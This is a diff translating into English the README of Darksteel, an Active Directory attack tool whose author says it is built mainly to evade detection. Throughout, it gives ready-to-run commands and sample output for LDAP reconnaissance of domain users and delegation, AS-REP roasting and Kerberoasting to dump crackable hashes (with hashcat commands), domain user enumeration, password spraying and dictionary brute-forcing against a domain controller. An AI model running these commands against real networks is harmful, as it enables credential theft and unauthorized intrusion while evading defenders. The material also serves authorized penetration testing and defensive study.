@@ -1,18 +1,17 @@
 # Darksteel
-# 介绍
-Darksteel是一款域内自动化信息搜集并利用的工具。在渗透时发现单独搜集域内信息比较繁琐，漏洞利用也需要很多工具，所以完成此项目，帮助我解决域内信息搜集繁琐问题以及漏洞利用问题。此项目以规避检测为主要目的完成，直接对域控进行攻击的利用没有做，因为如果有设备会产生大量的告警，后续可能会添加bypass检测的利用。
-
-### 项目主要功能
+# Introduction
+Darksteel is a tool for automated information gathering and exploitation in the domain. In the penetration found that separate collection of information within the domain is tedious, vulnerability exploitation also requires a lot of tools, so the completion of this project to help me solve the problem of tedious collection of information within the domain and vulnerability exploitation problems. This project is completed with the main purpose of circumventing detection, the exploitation of direct attacks on the domain control is not done, because if there is a device will generate a large number of alerts, and subsequently may add the exploitation of bypass detection.
+### Features
 
 ```
 ldap
-当我们拥有一个域内账号密码(hash)，可以通过ldap进行搜集域内有用信息，如spn、委派、存活计算机等等信息，为域渗透进行准备
+When we have a domain password (hash), we can use ldap to gather useful information about the domain, such as spn, delegate, surviving computers, etc.
 
 kerberos
-针对kerberos漏洞进行利用
+Exploit for kerberos vulnerability
 
 blast
-爆破域用户
+Blast Domain Users
 ```
 
 ```
@@ -140,9 +139,9 @@ blast Blasting Domain User
   -v    Whether a failure message is displayed
 
 ```
-# 使用实例
+# Usage Examples
 ## Ldap
-##### 1、当我们拥有一个域内账号密码(hash)，可以通过ldap进行搜集域内有用信息，如spn、委派、存活计算机等等信息，为域渗透进行准备
+##### 1、When we have a domain account password (hash), we can use ldap to collect useful information in the domain, such as spn, delegate, surviving computers and other information to prepare for domain penetration
 ```
 darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -all
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
@@ -273,7 +272,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
         mssql/DESKTOP-AO8D722
 ```
 
-##### 2、当我们想要查找域内某些关键字对应的user或者computer时可以使用关键字查询，来找到哪些是管理员user和管理员computer
+##### 2、When we want to find out which user or computer corresponds to certain keywords in the domain, we can use the keyword query to find out which are the administrative users and administrative computers
 ```
 darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -fuzz 管理员
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
@@ -293,7 +292,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
 [*] CN=zz,CN=Users,DC=test,DC=com   --> 假管理员
 ```
 
-##### 3、如果想查询的内容工具内没有写到也可以使用ldap语法进行查询
+##### 3、If the content you want to query is not written in the tool you can also use the ldap syntax to query
 ```
 darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -f "(objectClass=Computer)" -n cn,dNSHostName
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
@@ -321,7 +320,7 @@ dNSHostName: [WIN-7UI852PL.test.com]
 ```
 ## Kerberos
 
-##### 1、利用kerberos不需要域认证对用户密钥进行获取，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 18200 hash.txt pass.txt --force
+##### 1、Use kerberos does not require domain authentication to obtain the user key, you can choose to output hashcat or john blast format (default is hashcat) blast out the password is the user's password, if you do not specify the target user will need a domain user account password for ldap query and output all available keys. hashcat Blast command ：hashcat -m 18200 hash.txt pass.txt --force
 
 ```
 darksteel.exe kerberos -m asreproast -dc 192.168.1.1 -domain test.com -user user -pass password(hash)
@@ -350,7 +349,7 @@ a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
 
 ```
 
-##### 2、指定目标用户，则不需要域用户认证
+##### 2、Specify the target user, then domain user authentication is not required
 
 ```
 darksteel.exe kerberos  -m asreproast -dc 192.168.1.1 -domain test.com -tuser zz
@@ -377,7 +376,7 @@ a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
 7c5b84fcac701107da4300db4cfc36d58cc0524f23b5e16789656
 ```
 
-##### 3、如果目标将用户设置了spn后，则可以将密钥输出，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 13100 hash.txt pass.txt --force
+##### 3、If the target will be set after the user spn, the key can be output, you can choose to output hashcat or john blast format (default is hashcat) blast out the password is the user's password, if you do not specify the target user will need a domain user account password for ldap query and output all available keys. hashcat Blast command ：hashcat -m 13100 hash.txt pass.txt --force
 
 ```
 darksteel.exe kerberos -m kerberoast -dc 192.168.1.1 -domain test.com -user user -pass password(hash) 
@@ -432,7 +431,7 @@ f7aeb47dc601826d6643f95c33c7d388a3120b08ed2864e0c0bdacfb41594cea5d286583ed2fd520
 89857642a160760dca1cea4
 ```
 ## blast
-##### 1、当我们找到域但还没有域用户的时候可以使用域用户枚举进行枚举域用户。想要输出失败信息可以使用-v参数
+##### 1、When we find a domain but no domain user yet, we can use the domain user enumeration to enumerate domain users. To output a failure message you can use the -v parameter
 
 ```
 darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt
@@ -472,7 +471,7 @@ darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users
 Done! Tested logins in 0.002 seconds
 ```
 
-##### 2、找到用户后使用单个密码进行爆破
+##### 2、Find the user and use a single password to blast
 ```
 darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile users.txt -pass 123456
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
@@ -490,7 +489,7 @@ darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user
 Done! Tested logins in 0.024 seconds
 ```
 
-##### 3、使用密码字典爆破单个用户
+##### 3、Blasting individual users with a password dictionary
 
 ```
 darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -passfile pass.txt
@@ -509,7 +508,7 @@ darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -pass
 Done! Tested logins in 0.013 seconds
 ```
 
-##### 4、使用用户名密码对应字典爆破
+##### 4、Use username password dictionary blasting
 
 ```
 darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
@@ -528,125 +527,125 @@ darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
 Done! Tested logins in 0.010 seconds
 ```
 
-# 其他用法
+# Other Uses
 ## ldap
 
-##### 支持密码为hash
+##### Support password for hash
 ```
 darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass hash 
 ```
 
-##### 查询域内单条内容 -m指定
+##### Query a single entry in the domain -m specifies
 
 ```
 darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -m computer
 ```
-##### 查询所有委派信息 -w指定
+##### Query all assignment information -w Specify
 
 ```
 darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -w all
 ```
-#### 可选择参数
+#### Optional parameters
 
 ```
--o                  保存文件（不包括自定义查询）
+-o                  Save files (not including custom queries)
 
--ldapsizelimit      最大查询数（默认所有）
+-ldapsizelimit      Maximum number of queries (default all)
 
--m                  指定单独查询内容
+-m                  Specify individual query content
 
--w                  指定单独查询委派内容
+-w                  Specify the contents of a separate inquiry assignment
 ```
 
 
 ## kerberos
-##### kerberoasting（支持密码为hash）
+##### kerberoasting（Support password for hash）
 
-##### 利用所有用户并输出
+##### Utilize all users and export
 
 ```
 darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast
 ```
-##### 利用指定test用户并输出
+##### Use the specified test user and output
 
 ```
 darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast -tuser test
 ```
 
-##### 使用TGT进行认证（只可利用单用户）
+##### Authentication using TGT (only single user can be utilized)
 
 ```
 darksteel kerberos -dc 192.168.1.1 -ticket 123.kirbi -m kerberoast -tuser test
 ```
 
-##### asreproast（支持密码为hash）
+##### asreproast（Support password for hash）
 
-##### 利用所有用户并输出
+##### Utilize all users and export
 
 ```
 darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m asreproast
 ```
 
-##### 利用指定test用户并输出
+##### Use the specified test user and output
 
 ```
 darksteel kerberos -dc 192.168.1.1 -domain test.com  -m asreproast -tuser test
 ```
-#### 可选择参数
+#### Optional parameters
 
 ```
--o                  保存文件（不包括自定义查询）
+-o                  Save files (not including custom queries)
 
--ldapsizelimit      最大查询数（默认所有）
+-ldapsizelimit      Maximum number of queries (default all)
 
--enctype            选择加密方式（默认rc4）
+-enctype            Select encryption method (default rc4)
 
--format             选择输出爆破格式（默认hashcat）
+-format             Select format (default hashcat)
 ```
 
 ## blast
 
-##### 域用户枚举
+##### Domain User Enumeration
 
 ```
 darksteel blast -m userenum -dc 192.168.1.1 -domain test.com -userfile user.txt
 ```
-##### 密码喷洒
+##### Password spray
 
 ```
 darksteel blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user.txt -pass 123456
 ```
 
-##### 单用户密码爆破
+##### Single User Password Blast
 
 ```
 darksteel blast -m blastpass -dc 192.168.1.1 -domain test.com -user admin -passfile password.txt
 ```
 
-##### 用户对应密码爆破（字典格式 admin:123456）
+##### User corresponding password blast (dictionary format admin:123456)
 
 ```
 darksteel blast -m userpass -dc 192.168.1.1 -domain test.com -upfile userpassword.txt
 ```
 
-#### 可选择参数
+#### Optional parameters
 ```
--v      输出失败信息
+-v      Output failure message
 
--t      线程设置（默认20）
+-t      Thread setting (default 20)
 
--o      输出文件
+-o      Output file
 
-blast时如果在域内使用则可以不指定dc。目前ldap查询不支持
+blast can be used without specifying dc if it is used within a domain. ldap queries are not currently supported
 ```
 
-# TODO 
+# TODO
 ```
-1、持续添加其他利用方式
+1、Continue to add other ways to utilize
 
-2、添加其他信息搜集内容
+2、Add additional information gathering content
 
-3、修改BUG
+3、Modify bugs
 ```
 
 # Thank
